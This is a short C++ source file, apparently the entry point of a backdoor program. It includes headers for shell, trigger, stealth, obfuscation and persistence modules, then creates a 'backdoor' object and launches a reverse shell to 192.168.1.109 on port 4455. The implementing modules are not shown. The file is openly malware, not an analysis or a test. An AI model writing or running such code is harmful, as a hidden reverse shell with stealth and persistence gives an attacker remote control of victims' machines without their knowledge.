#include "shell/shell.h"
#include "trigger/trigger.h"
#include "stealth/stealth.h"
#include "obfuscation/obfuscation.h"
#include "persistence/persistence.h"

using namespace std;

int main(){
    Shell backdoor("192.168.1.109", 4455);
    backdoor.launchReverseShell();

    
    return 0;
}